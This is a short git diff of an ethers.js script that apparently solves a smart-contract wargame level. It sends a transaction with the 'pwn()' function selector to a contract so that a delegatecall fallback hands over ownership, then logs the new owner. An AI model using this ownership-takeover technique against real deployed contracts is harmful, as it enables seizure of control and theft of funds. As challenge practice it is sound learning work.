@@ -13,7 +13,7 @@ async function main() {
   );
 
   const delegation = new ethers.Contract(
-    "0xB821CeCa2EaF3ac203D1AD2F428d9bf2D10F364f",
+    "0x58f60F03a855111b1Df15bE3E411f1E53322F125",
     abi,
     signer
   );
@@ -25,15 +25,17 @@ async function main() {
   // }
   //   the code returned "0xdd365b8b"
   // Can I do it with ether.js?
-  const tx = {
-    from: "0xEE4C6578F5AB9B07b9599Ac51c84a83BB264AAfe",
-    to: "0xB821CeCa2EaF3ac203D1AD2F428d9bf2D10F364f",
-    data: "0xdd365b8b",
-  };
 
-  const transaction = await signer.sendTransaction(tx);
-  //   Why is this not working?
+  const transaction = await signer.sendTransaction({
+    to: "0x58f60F03a855111b1Df15bE3E411f1E53322F125",
+    data: "0xdd365b8b",
+    gasLimit: 12450000,
+  });
+  //   It works from web console with these:
+  // await web3.utils.sha3("pwn()")
+  // await contract.sendTransaction({ data: "0xdd365b8b" })
   await transaction.wait(1);
+  console.log(transaction);
   console.log(await delegation.owner());
 }
 
